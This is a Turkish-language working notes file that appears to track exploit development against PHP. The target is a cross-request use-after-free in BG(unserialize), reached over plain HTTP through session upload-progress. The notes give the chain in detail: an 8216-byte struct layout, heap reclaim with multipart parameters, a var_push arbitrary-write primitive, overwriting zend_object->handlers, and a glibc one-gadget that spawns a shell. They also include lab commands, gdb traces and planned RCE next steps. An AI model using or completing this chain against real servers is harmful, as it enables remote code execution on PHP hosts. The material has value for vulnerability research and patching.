# Yeni kök neden: pre-RINIT `BG(unserialize)` istekler-arası kalıntı UAF (saf HTTP hattı)

Bu dosya, kullanıcının sağladığı yeni exploit zincirini ve bu hattın bağımsız çoğaltma ilerlemesini
kaydeder. **Daha önceki `session_unset`/`session_encode` özel PHP exploit'i artık geçerli bir sonuç
olarak kabul edilmiyor** ("özel PHP yazma, tamamen uzaktan" gereksinimini ihlal ediyor), ilgili
sayfalar webroot'tan taşındı.

---

## 1. Yeni zincir (kullanıcı istihbaratı)

1. İlk istek, upload-progress büyük bir session'ı decode ederken OOM olur ve `BG(unserialize).level=1` ile **zaten serbest bırakılmış `data`**'yı geride bırakır.
2. İkinci istek iki adet 8214 baytlık multipart parametresiyle bu 8216 baytlık nesneyi geri kazanır.
3. Ters eğik çizgi katlama (backslash folding) ile geçerli 48 bitlik bir `data->last` işaretçisi kurulur.
4. İkili (binary) progress marker ile `var_entries` forge edilir, `var_push` isteğe bağlı adres yazımına dönüştürülür.
5. İki seviyeli `var_entries` tramplini (trampoline) nihayetinde `zend_object->handlers`'ın üzerine yazar.
6. Nesne yıkımı glibc one-gadget'a girer; GDB doğrular:
   ```
   VAR_PUSH ... destination=0x7f9d62671000 rval=0x7f9d62664980
   VAR_PUSH ... destination=0x7f9d62602608 rval=0x7f9d62664940
   process 2544 is executing new program: /usr/bin/dash
   ```

Açık, kamuya açık analizin iddia ettiği progress önbellek bucket'ı UAF'si değil, **pre-RINIT aşamasında `BG(unserialize)` durumunun istekler-arası kalıntısıdır**.

---

## 2. Kaynak kod eşlemesi

### 2.1 8216 baytlık nesne

`ext/standard/var_unserializer.re`:

```c
#define VAR_ENTRIES_MAX 1018
typedef struct {
    zend_long used_slots;     // 8
    void *next;               // 8
    zval *data[1018];         // 8144
} var_entries;                // 8160

struct php_unserialize_data {
    var_entries      *last;          // 0
    var_dtor_entries *first_dtor;    // 8
    var_dtor_entries *last_dtor;     // 16
    HashTable        *allowed_classes; // 24
    HashTable        *ref_props;     // 32
    zend_long         cur_depth;     // 40
    zend_long         max_depth;     // 48
    var_entries       entries;       // 56
};                                    // sizeof = 56 + 8160 = 8216
```

gdb `sizeof(struct php_unserialize_data) == 8216` olduğunu doğruladı.

### 2.2 Yaşam döngüsü (lifecycle)

```c
php_var_unserialize_init():
    if (BG(serialize_lock) || !BG(unserialize).level) {
        d = emalloc(8216);
        d->last = &d->entries;
        ...
        BG(unserialize).data = d;
        BG(unserialize).level = 1;
    } else {
        d = BG(unserialize).data;   // stale yeniden kullanım
        ++BG(unserialize).level;
    }

php_var_unserialize_destroy():
    if (BG(serialize_lock) || BG(unserialize).level == 1) {
        var_destroy(&d); efree(d);
    }
    if (!BG(serialize_lock) && !--BG(unserialize).level)
        BG(unserialize).data = NULL;
```

OOM/`zend_bailout`, `PHP_VAR_UNSERIALIZE_DESTROY`'u atlar, `level` 1 kalır, `data` sarkan olur;
bir sonraki pre-RINIT'in `unserialize`'ı bu yapıyı doğrudan yeniden kullanır.

### 2.3 `var_push` yazma primitifi

```c
static inline void var_push(php_unserialize_data_t *var_hashx, zval *rval)
{
    var_entries *var_hash = (*var_hashx)->last;
    if (var_hash->used_slots == VAR_ENTRIES_MAX) {
        var_hash = emalloc(sizeof(var_entries));
        ...
        (*var_hashx)->last->next = var_hash;
        (*var_hashx)->last = var_hash;
    }
    var_hash->data[var_hash->used_slots++] = rval;
}
```

Eğer `data->last` saldırgan kontrolündeyse, yazma adresi:

```text
*(zval**)(last + offsetof(var_entries, data) + used_slots*8) = rval
= last + 16 + used_slots*8
```

`rval` bir `zval*`'tır (tahmin edilebilir unserializer geçici değer adresi); `used_slots` de geri
kazanım içeriğiyle kontrol edilebilir. İki seviyeli tramplin, ilk yazılan işaretçiyi ikincinin
`last`/hedefi olarak kullanıp nihayetinde `zend_object->handlers`'ın üzerine yazabilir, nesne
yıkımı one-gadget'a girer.

---

## 3. Bu hattın saf HTTP çoğaltma ilerlemesi

### 3.1 Ön koşul: upload-progress ile büyük session oluşturmak (saf HTTP)

- Apache lab yapılandırması değiştirilebilir: 64M + `session.upload_progress.cleanup Off` dosya oluşturmak için; 8M + cleanup On A/B için.
- İstek 0: multipart `PHPSESSID` + `PHP_SESSION_UPLOAD_PROGRESS=<4MB 'A'>` + dosya kısmı.
- Fiilen: `/tmp/sess_bgtest123` = **4.194.655 bayt**.
- Küçük session: `/tmp/sess_bgsmall123` = 351 bayt, ikinci isteğin normal decode'u için.

### 3.2 İstek A: post-RINIT büyük session decode OOM

Hedef sayfa sıradan bir session sayfasıdır:

```php
<?php session_start(); echo "ok\n"; ?>
```

İstek: `GET /index.php`, `Cookie: PHPSESSID=bgtest123`. Oturum 4MB veriyi decode eder, 8M limit altında OOM olur.

Fiilen:

```text
HTTP/1.1 200 OK
Fatal error: Allowed memory size of 8388608 bytes exhausted ...

basic_globals.unserialize.level = 1
basic_globals.unserialize.data  = 0x7ffff5e6d000
```

Bu `data` bir `php_unserialize_data`'dır (8216B); `last=&entries` (+0x38). İstek shutdown'dan sonra
bu nesne zaten serbest bırakılmıştır (BG işaretçisi sarkan).

### 3.3 İstek B: pre-RINIT sarkan BG'yi yeniden kullanır, parametreler yapıyı geri kazanır

Şekil (`tools/bg_b.py` / `tools/bg_b_file.py`):

- Dosyasız: `PHPSESSID=bgsmall123`, `PHP_SESSION_UPLOAD_PROGRESS=pwn`, iki adet 8214 baytlık alan `p1`/`p2` (boundary 10 karakter).
- END cleanup, RINIT'ten önce `php_session_initialize` → `s_read` → `php_var_unserialize_init`'i çağırır, stale `BG.data`'yı yeniden kullanır.

Fiilî gdb:

```text
INIT level=1 data=0x7ffff5e6d000
0x7ffff5e6d000: 0x00007ffff5e6d030 0x41da9b9294603d72
0x7ffff5e6d010: 0x00007ffff5e6d020 0x51da9b9294603d72
0x7ffff5e6d020: 0x00007ffff5e6d000 0x71da9b9294603d72
0x7ffff5e6d030: 0x00007ffff5e6d040 0x31da9b9294603d72
INIT level=0 data=(nil)
```

- `BG.level=1`, `data` hâlâ A'nın adresi, pre-RINIT yeniden kullanımın başarılı olduğunu gösterir;
- 8216 yapısı multipart içeriğiyle yeniden yazılmış, `data->last` vb. alanları yapı içine işaret eden işaretçilere dönüşmüş (0x...6d030/6d020/6d000/6d040);
- Dosyalı sürüm (`bg_b_file.py`) FILE_START decode sırasında, yapı `a.bin`/`Content-` vb. multipart header içeriğiyle yeniden işgal edilir, ardından `tmp_var` konumunda `last_dtor` dereference çöker:

```text
INIT level=1 data=0x7ffff5e6d000
0x...6d000: 0x0000006e69622e61 0x554acc7090e8c40e
0x...6d010: 0x2d746e65746e6f43 0x354acc0065707954
0x...6d020: 0x00007ffff5e6d040 0x554acc7090e8c40e
SIGSEGV addr=(nil)
#0 tmp_var (num=1, ...)
#1 var_tmp_var
#2 ps_srlzr_decode_php
#3 php_session_decode
#4 php_session_initialize
#5 php_session_rfc1867_update
#6 php_session_rfc1867_callback
#7 rfc1867_post_handler
```

### 3.4 Doğrulanmış gerçekler

- `BG(unserialize).level=1` ile `data`, A'nın post-RINIT OOM'undan sonra istekler-arası korunur;
- B'nin pre-RINIT `php_var_unserialize_init`'i bu sarkan `data`'yı yeniden kullanır (yeni tahsis yok);
- İki adet 8214 baytlık multipart parametresi/parser buffer'ı 8216 baytlık yapıyı yeniden yazabilir;
- Yapı alanları `var_entries`/`var_dtor_entries` işaretçileri olarak kullanılır, `tmp_var`/`var_push` bu işaretçiler boyunca okuyup yazar (`tmp_var` çökmesi görüldü).

### 3.5 Henüz tamamlanmayan

- Kullanıcı zincirindeki "ters eğik çizgi katlama" ile `data->last`'ı mevcut yapı-içi öz-işaretçi yerine **herhangi bir geçerli 48 bitlik işaretçi** olarak tam kontrol etmek;
- fake `var_entries` kurmak, `used_slots`'u kontrol etmek, `var_push`'u hedef adres yazımına dönüştürmek;
- İki seviyeli tramplinle `zend_object->handlers`'ın üzerine yazmak ve glibc one-gadget adresi (ASLR altında leak gerekir);
- A'nın OOM/büyük session hazırlığını tamamen uzaktan tekrarlanabilir bir sürece dönüştürmek (mevcut lab, Apache yapılandırmasının 64M/cleanup Off ile 8M/cleanup On arasında değiştirilmesini gerektiriyor; gerçek hedef uygulamanın kendi büyük session'ına ve memory_limit'ine bağlı).

---

## 4. Çoğaltma komutları (lab)

```bash
# 1) 64M + cleanup Off ile session oluştur (saf HTTP)
sudo sed -i 's/php_admin_value memory_limit .*/php_admin_value memory_limit 64M/; s/php_admin_value session.upload_progress.cleanup .*/php_admin_value session.upload_progress.cleanup Off/' /etc/apache2/conf-available/php8426.conf
sudo apache2ctl -k stop; sudo bash -c 'ulimit -c unlimited; setarch $(uname -m) -R /usr/sbin/apache2ctl -k start'
cd ~/php-lab
SID=bgsmall123 python3 bg_create.py 8
SID=bgtest123 python3 bg_create.py 4194304

# 2) 8M + cleanup On, A büyük session'ı decode edip OOM
sudo sed -i 's/php_admin_value memory_limit .*/php_admin_value memory_limit 8M/; s/php_admin_value session.upload_progress.cleanup .*/php_admin_value session.upload_progress.cleanup On/' /etc/apache2/conf-available/php8426.conf
sudo apache2ctl -k stop; sudo bash -c 'ulimit -c unlimited; setarch $(uname -m) -R /usr/sbin/apache2ctl -k start'
python3 bg_cookie_a.py        # GET + Cookie PHPSESSID=bgtest123, OOM'u doğrula

# 3) B: pre-RINIT BG'yi yeniden kullan
python3 bg_b.py               # dosyasız, iki 8214 parametre
# ya da python3 bg_b_file.py     # dosyalı, FILE_START decode
```

gdb gözlem noktaları:

```gdb
b php_var_unserialize_init
commands
silent
printf "INIT level=%u data=%p\n", basic_globals.unserialize.level, basic_globals.unserialize.data
x/8gx basic_globals.unserialize.data
continue
end
```

---

## 5. Eski belgelerle ilişki

- `NOTES.md` bölüm 3/10'daki `session_unset`/`session_encode` özel PHP exploit'i **artık geçerli teslimat olarak kabul edilmiyor**; Defect D/sızıntı mekanizmasını kanıtladılar, ama mevcut "hedef-tarafı özel PHP yok, saf HTTP" kısıtını ihlal ediyorlar.
- Eski exploit sayfaları `~/php-lab/offline/`'a taşındı, webroot'ta yalnızca sıradan `index.php` kaldı.
- Yeni hat `BG(unserialize)` UAF'ye göre devam eder; bir sonraki adımın özü 8216 yapı alanlarının kesin yerleşimi ve `var_push` iki seviyeli yazımıdır.

---

## 6. Referans loglar

- `logs/bg_gf.log` — post-RINIT A + B pre-RINIT `INIT level=1` (yapının parametreyle üzerine yazılmadığı sürüm).
- `logs/bg_gi.log` — post-RINIT A + B dosyalı, yapı multipart içeriğiyle yeniden işgal edilir ve `tmp_var`'da çöker.
- `logs/bg_gj.log` — post-RINIT A + B dosyasız, iki 8214 parametre, yapı-içi öz-işaretçi.

---

## 7. 2026-10-21 ek: watchpoint'in ortaya çıkardığı allocator davranışı (RCE'den önceki son engel)

A sonrası `BG.data`'ya (bu örnekte `0x7ffff5e6d000`) donanım watchpoint koyup, B gönderildiğinde
(dosyasız, iki 8214 parametre), şu elde edilir:

```text
WATCH#1 val=0x7461642d6d726f66   # "form-data"
  #0 memcpy
  #1 _estrndup
  #2 php_ap_getword
  #3 rfc1867_post_handler
WATCH#2 val=0x7ffff5e6d010
  #0 zend_mm_set_next_free_slot
  #1 zend_mm_free_small (bin_num=1, ptr=0x7ffff5e6d000)
  #2 zend_mm_free_heap
  #3 _efree
  #4 rfc1867_post_handler
WATCH#3 val=0x7fff656d616e   # "name="
WATCH#6 val=0x316c6c616d736762 # "bgsmall1" (PHPSESSID değeri)
  #1 multipart_buffer_read_body
```

Sonuç: bizim post-RINIT A senaryomuzda, **8216 baytlık `php_unserialize_data` bloğu Zend MM
tarafından geri alınmış ve 16 baytlık küçük bin'lere parçalanmış**; B parse ederken önce
`_estrndup("form-data")`, `"name="`, PHPSESSID değeri vb. küçük string'ler `0x...6d000`'i defalarca
işgal eder; bu yüzden iki 8214 parametre beklendiği gibi bu adresi bütün bir blok olarak işgal
etmez, `data->last`'ın okuduğu şey small-bin boş zincir işaretçisidir (0x...6d030 vb.), saldırgan
kontrollü 48 bitlik işaretçi değildir.

`zend_mm_free_small(bin_num=1)` en küçük 16 baytlık bin'e karşılık gelir;
`form-data`(10B)/`name=`(6B)/`bgsmall123`(11B) hepsi bu bin'e düşer. struct başlığının 56 baytı
`0x...6d000/6d010/6d020/6d030` olmak üzere dört 16B slota parçalanır ve boş zincir her slotun
ilk qword'ünün üzerine yazar.

### Bir sonraki adım (RCE)

1. **8216 bloğu küçük bin'lere parçalanmak yerine büyük blok boş (large-free) tutmak**:
   - Farklı A bitiş yöntemleri dene (pre-RINIT OOM shutdown yok vs post-RINIT shutdown; `unclean_shutdown`/`report_memleaks` bayrakları), böylece B başlarken heap geri alımı bu bloğu large-free zincirinde bırakır;
   - ya da B'nin en başına önce 8193/8215'lik büyük bir buffer tahsis et (iki 8214 parametreden önce), small-bin parçalanmasından önce bu bloğu kap.
2. `data->last` kontrol edilebilir olduğunda:
   - `last_dtor=0` yap, `tmp_var` `emalloc` dalına gitsin;
   - parametre buffer'ında/komşu büyük blokta `var_entries` forge et (`used_slots`, `next`, `data[]`), `var_push`'ın yazma hedefini `zend_object->handlers` yap;
   - iki seviyeli tramplin + nesne yıkımı + glibc one-gadget.
3. ASLR'yi RCE'den sonraya bırak: yeni zincirin hazır bir saf HTTP sızıntısı yok; `var_push` yazımının kendisinin kurduğu okuma/yazmayı, ya da aynı BG UAF'nin kontrollü sınır-dışı okumasını değerlendirebilirsin, daha önceki özel PHP'nin `session_encode` sızıntısını tekrar kullanmak yasak.

### Kanıt

- watchpoint ham logu: `logs/bg_watch.log` (bu turda `/tmp/gw.log`).

---

## 8. RCE'nin gerçek ön koşulu: `BG(serialize_lock)=1` (hedef-uygulama bağımlılığı)

Kaynak kod doğrulaması:

```c
PHPAPI void php_var_unserialize_destroy(php_unserialize_data_t d) {
    if (BG(serialize_lock) || BG(unserialize).level == 1) {
        var_destroy(&d);
        efree(d);                 // 8216 bloğu serbest bırakır
    }
    if (!BG(serialize_lock) && !--BG(unserialize).level) {
        BG(unserialize).data = NULL;
    }
}
```

Yalnızca `BG(serialize_lock) == 1` iken "**d zaten efree edilmiş, ama BG.level hâlâ 1, BG.data hâlâ
d'ye işaret ediyor**" sarkan durumu ortaya çıkar; bu aynı zamanda large-free bloğun (tüm heap
shutdown'ı tarafından small bin'e parçalanmayan) kaynağıdır.

`BG(serialize_lock)++/--`'ın konumları:

- `ext/standard/var_unserializer.re` yaklaşık 277/294 satırları: nesne `__wakeup` / `__unserialize` çağrısından önce/sonra;
- sınıf arama/autoload/unserialize_callback_func çağrısından önce/sonra (yaklaşık 1232/1256/1268 satırları);
- `ext/standard/var.c` 855/876: serialize magic method'ları.

Bu yüzden saldırı zincirinin ilk isteği şu olmalı: **session verisi, decode sırasında OOM tetikleyen
bir `__wakeup`/`__unserialize` (ya da autoload/unserialize_callback_func) içeren bir nesne içermeli**.
OOM'un `zend_bailout`'u `BG(serialize_lock)--`'ı atlar, ardından dıştaki destroy lock=1 görür,
`efree(d)` yapar ama BG'yi temizlemez, large-free sarkan 8216 blok bırakır.

Bizim lab'ımızdaki büyük session yalnızca dizi/string içerir (upload-progress'in ürettiği progress
verisi), nesne magic method'u yok, dolayısıyla:

- Normal decode OOM: destroy hiç çalışmadı, `d` hâlâ tahsisli (daha önceki pre-RINIT A'nın `data` belleği eksiksiz);
- post-RINIT OOM + istek shutdown: tüm heap geri alımı, 8216 blok 16 baytlık small bin'e parçalanır (watchpoint kanıtladı), 8214 parametre bütün bir blok olarak geri kazanılamaz.

**Sonuç: bu zincir "vanilla session sayfası + saf HTTP ile kurulmuş dizi session" üzerinde
ulaşılamaz; hedef uygulamanın session'a `__wakeup`/`__unserialize` içeren bir nesne koymasını
(ya da autoload/unserialize_callback_func yapılandırmasını) gerektirir.** Bu bir uygulama katmanı
bağımlılığıdır, B istek parametrelerinin telafi edebileceği bir şey değildir.

### Devam için gereken karar

- Lab hedef sayfasına **yalnızca doğrulama amaçlı bir scaffold sınıfı** eklemeye izin ver (`__wakeup` içinde büyük tahsis OOM), önce sonraki `var_entries`/`zend_object->handlers`/one-gadget'ı aşmak için; nihai exploit bu PHP'yi içermez, onu yalnızca hedef uygulamada zaten var olan gadget'ın yerine koyar.
- Ya da gerçek hedef uygulamada session'a giren nesneyi/sınıfı sağla (hangi uygulama, hangi session anahtarı, hangi magic method), ben o nesneye göre büyük session kurayım.
- Yukarıdakilerden biri elde edilene kadar, vanilla sayfada zorla devam etmek yalnızca forge/özel PHP ile mümkün, bu da mevcut kısıtı ihlal eder.
